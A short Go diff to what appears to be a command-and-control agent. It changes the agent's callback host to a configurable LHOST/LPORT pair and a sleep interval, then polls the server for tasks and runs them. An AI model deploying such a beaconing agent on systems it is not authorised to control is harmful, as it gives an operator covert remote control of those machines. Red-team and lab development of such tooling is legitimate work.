@@ -20,9 +20,12 @@ var (
 )
 
 func main() {
+	LHOST := "192.168.174.154"
+	LPORT := 8001
+	SLEEP := 5
 	generateMetadata()
 	loadAgentCommands()
-	commModule = models.NewHttpCommModule("localhost", 8001)
+	commModule = models.NewHttpCommModule(LHOST, LPORT)
 	commModule.Init(metadata)
 
 	done := commModule.Start()
@@ -32,7 +35,7 @@ func main() {
 		select {
 		case <-done:
 			return
-		case <-time.After(time.Second * 5):
+		case <-time.After(time.Second * time.Duration(SLEEP)):
 			tasks, ok := commModule.RecvData()
 			if ok {
 				handleTasks(tasks)
